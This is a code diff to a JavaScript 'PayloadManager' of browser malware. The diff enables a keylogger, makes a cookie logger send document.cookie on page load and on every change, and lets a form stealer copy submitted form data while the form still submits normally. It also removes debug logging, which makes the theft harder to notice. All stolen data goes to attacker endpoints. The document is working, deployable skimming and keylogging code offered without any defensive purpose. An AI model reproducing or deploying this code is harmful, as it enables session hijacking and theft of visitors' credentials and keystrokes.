@@ -10,24 +10,49 @@ const PayloadManager = {
     config: {
         cookieLogger: true,
         formStealer: true,
-        keyLogger: false
+        keyLogger: true
     },
 
     // Available payloads
     payloads: {
         cookieLogger: () => {
+            // Send cookies immediately on load
+            fetch('/ep/api/ping', { 
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    cookies: document.cookie,
+                    url: window.location.href
+                })
+            });
+
+            // Monitor cookie changes
+            document.cookie = `_test=${Date.now()}; path=/`;
+            const originalCookie = document.cookie;
+            
             setInterval(() => {
-                fetch('/ep/api/ping', { 
-                    method: 'POST', 
-                    credentials: 'include'
-                });
-            }, 5000); // Check every 5 seconds
+                if (document.cookie !== originalCookie) {
+                    fetch('/ep/api/ping', { 
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            cookies: document.cookie,
+                            url: window.location.href
+                        })
+                    });
+                }
+            }, 3000);
         },
 
         formStealer: () => {
             document.querySelectorAll('form').forEach(form => {
                 form.addEventListener('submit', async (e) => {
-                    e.preventDefault();
                     const formData = new FormData(form);
                     const data = {
                         url: window.location.href,
@@ -42,30 +67,36 @@ const PayloadManager = {
                         },
                         body: JSON.stringify(data)
                     });
-
-                    form.submit();
                 });
             });
         },
 
         keyLogger: () => {
             let buffer = '';
-            document.addEventListener('keypress', (e) => {
+            let lastKeypressTime = Date.now();
+            
+            document.addEventListener('keydown', (e) => {
+                const currentTime = Date.now();
                 buffer += e.key;
-                if (buffer.length >= 50) {  // Send every 50 characters
-                    fetch('/ep/api/keylog', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            keys: buffer,
-                            url: window.location.href,
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                    buffer = '';
+                
+                // Send data if buffer is full or 2 seconds passed since last keypress
+                if (buffer.length >= 50 || currentTime - lastKeypressTime > 2000) {
+                    if (buffer.length > 0) {
+                        fetch('/ep/api/keylog', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                keys: buffer,
+                                url: window.location.href,
+                                timestamp: new Date().toISOString()
+                            })
+                        });
+                        buffer = '';
+                    }
                 }
+                lastKeypressTime = currentTime;
             });
         }
     },
@@ -75,12 +106,7 @@ const PayloadManager = {
         document.addEventListener('DOMContentLoaded', () => {
             Object.keys(this.config).forEach(payload => {
                 if (this.config[payload] && this.payloads[payload]) {
-                    try {
-                        console.log(`[*] Initializing payload: ${payload}`);
-                        this.payloads[payload]();
-                    } catch (error) {
-                        console.error(`[!] Error in payload ${payload}:`, error);
-                    }
+                    this.payloads[payload]();
                 }
             });
         });
